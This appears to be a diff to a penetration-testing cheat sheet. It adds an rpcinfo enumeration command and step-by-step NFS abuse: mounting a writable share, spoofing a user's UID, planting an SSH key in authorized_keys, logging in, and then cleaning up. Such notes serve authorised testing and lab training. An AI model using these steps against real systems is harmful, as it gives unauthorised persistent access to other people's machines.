@@ -30,6 +30,10 @@ enumdomusers
 
 queryusergroups <RID>
 ```
+
+### [rpcinfo]
+`rpcinfo <IP>`
+
 ### [rpc enumeration]
 https://bitvijays.github.io/LFF-IPS-P3-Exploitation.html
 
@@ -203,7 +207,40 @@ if access is denied then replicate an account with the same UUID.
 
 sudo adduser pwn
 sudo sed -i -e 's/1001/1000/g' /etc/passwd
+
+
+If you have write access to the disk using mount
+
+mount -o rw,vers=2 10.10.10.10:/home /tmp/home
+
+useradd -m <username>
+
+impersonate suid
+
+cd /tmp/home/usersprofile/
+
+mkdir .ssh (If it doesn't exist)
+
+ssh-keygen  -> id_rsa
+
+Create authorized_keys as well and add in your public key
+
+chmod 600 authorized_keys
+
+copy the private key to your attacker box and ssh to the target.
+
+chmod 600 id_rsa
+
+ssh -i id_rsa usersprofile@10.10.10.10 -p 22
+
+done
+
+Cleaning up users when you're done
+
+userdel -f <username>
+delgroup <username>
 ```
+
 unmount NFS
 ```
 sudo umount /mnt
